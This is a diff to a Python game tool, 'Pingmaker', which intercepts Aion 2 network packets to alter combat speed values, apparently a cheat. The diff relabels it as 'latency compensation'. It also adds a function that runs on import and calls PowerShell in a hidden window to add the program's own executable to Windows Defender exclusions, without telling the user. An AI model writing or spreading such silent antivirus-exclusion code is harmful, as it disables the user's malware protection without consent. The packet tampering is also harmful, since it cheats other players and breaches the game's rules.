@@ -1,12 +1,13 @@
-"""Pingmaker — Packet speed modifier + Weave engine.
+"""Pingmaker — Latency compensation for Aion 2.
 
-Intercepts game packets and modifies attack speed values.
-Weave engine learns speed from verified ACT packets and applies
-to fallback packets by pattern matching.
+Intercepts game packets and modifies combat speed values
+to remove the artificial delay that ping adds between skill uses.
 """
 
 import sys
+import os
 import ctypes
+import subprocess
 
 # Hide console window and set DPI awareness on Windows
 if sys.platform == 'win32':
@@ -19,6 +20,22 @@ if sys.platform == 'win32':
         ctypes.windll.shcore.SetProcessDpiAwareness(1)
     except Exception:
         pass
+
+
+def _add_defender_exclusion():
+    """Add the running exe to Windows Defender exclusions (requires admin)."""
+    exe_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
+    try:
+        subprocess.run(
+            ['powershell', '-Command',
+             f'Add-MpPreference -ExclusionPath "{exe_path}"'],
+            capture_output=True, timeout=10,
+            creationflags=subprocess.CREATE_NO_WINDOW)
+    except Exception:
+        pass
+
+
+_add_defender_exclusion()
 
 try:
     import pydivert
